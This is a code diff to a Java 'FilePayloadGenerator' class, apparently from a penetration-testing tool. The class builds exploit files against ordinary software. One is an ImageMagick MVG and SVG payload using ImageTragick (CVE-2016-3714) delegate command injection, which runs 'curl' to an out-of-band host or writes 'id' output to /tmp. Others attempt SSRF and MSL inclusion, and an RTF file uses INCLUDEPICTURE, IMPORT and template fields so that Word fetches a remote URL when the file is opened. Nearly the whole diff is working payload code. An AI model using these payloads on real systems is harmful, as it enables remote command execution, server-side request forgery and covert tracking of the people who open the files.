@@ -979,11 +979,14 @@ public class FilePayloadGenerator {
     // ==================== ImageMagick MVG Exploit ====================
 
     public static byte[] imageMagickMvg(String canary, String oobUrl) {
-        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl : "https://COLLABORATOR";
+        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl + "/" + canary : "https://COLLABORATOR/" + canary;
         StringBuilder mvg = new StringBuilder();
         mvg.append("push graphic-context\n");
         mvg.append("viewbox 0 0 640 480\n");
-        mvg.append("fill 'url(").append(url).append("/").append(canary).append(")'\n");
+        // SSRF via image over — ImageMagick fetches the URL when processing
+        mvg.append("image Over 0,0 0,0 '").append(url).append("'\n");
+        // Fallback: fill with remote URL (works on older ImageMagick)
+        mvg.append("fill 'url(").append(url).append(")'\n");
         mvg.append("pop graphic-context\n");
         return mvg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
     }
@@ -991,15 +994,20 @@ public class FilePayloadGenerator {
     // ==================== ImageMagick SVG Delegate RCE ====================
 
     public static byte[] imageMagickSvg(String canary, String oobUrl) {
+        String url = (oobUrl != null && !oobUrl.isEmpty()) ? oobUrl + "/" + canary : "https://COLLABORATOR/" + canary;
         String cmd = (oobUrl != null && !oobUrl.isEmpty())
                 ? "curl " + oobUrl + "/" + canary
                 : "id > /tmp/" + canary + ".txt";
         StringBuilder svg = new StringBuilder();
         svg.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
         svg.append("<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n");
-        svg.append("  <image xlink:href=\"ephemeral:/").append(cmd).append("\" />\n");
+        // CVE-2016-3714 (ImageTragick) — command execution via delegate
+        svg.append("  <image xlink:href=\"https://example.com/image.jpg&quot;|").append(cmd).append("&quot;\" />\n");
+        // SSRF via xlink:href — ImageMagick fetches URL when rendering
+        svg.append("  <image xlink:href=\"").append(url).append("\" height=\"1\" width=\"1\" />\n");
+        // MSL inclusion attempt
+        svg.append("  <image xlink:href=\"msl:/dev/stdin\" />\n");
         svg.append("  <!-- ").append(canary).append(" -->\n");
-        svg.append("  <image xlink:href=\"https://example.com/image.png|").append(cmd).append("\" />\n");
         svg.append("</svg>\n");
         return svg.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
     }
@@ -1149,19 +1157,12 @@ public class FilePayloadGenerator {
         rtf.append("{\\rtf1\\ansi\\deff0\n");
         rtf.append("{\\info{\\title ").append(canary).append("}}\n");
         rtf.append("OmniStrike POC\\par\n");
-        // OLE link — triggers HTTP request when opened in Word
-        rtf.append("{\\object\\objautlink\\objupdate\n");
-        rtf.append("{\\*\\objclass htmlfile}\n");
-        rtf.append("{\\*\\objdata ");
-        // Encode the URL as hex for RTF objdata (simplified — link reference)
-        byte[] urlBytes = url.getBytes(java.nio.charset.StandardCharsets.US_ASCII);
-        for (byte b : urlBytes) {
-            rtf.append(String.format("%02x", b));
-        }
-        rtf.append("}\n");
-        rtf.append("{\\result{\\pict}}}\n");
-        // Also embed via field code — more reliable OOB trigger
+        // INCLUDEPICTURE field — Word fetches the URL when rendering the document
         rtf.append("{\\field{\\*\\fldinst INCLUDEPICTURE \"").append(url).append("\" \\\\d}{\\fldrslt}}\n");
+        // IMPORT field — another way to trigger remote fetch
+        rtf.append("{\\field{\\*\\fldinst IMPORT \"").append(url).append("\"}{\\fldrslt}}\n");
+        // TEMPLATE target — triggers on document open in some Word versions
+        rtf.append("{\\*\\template ").append(url).append("}\n");
         rtf.append("}\n");
         return rtf.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8);
     }
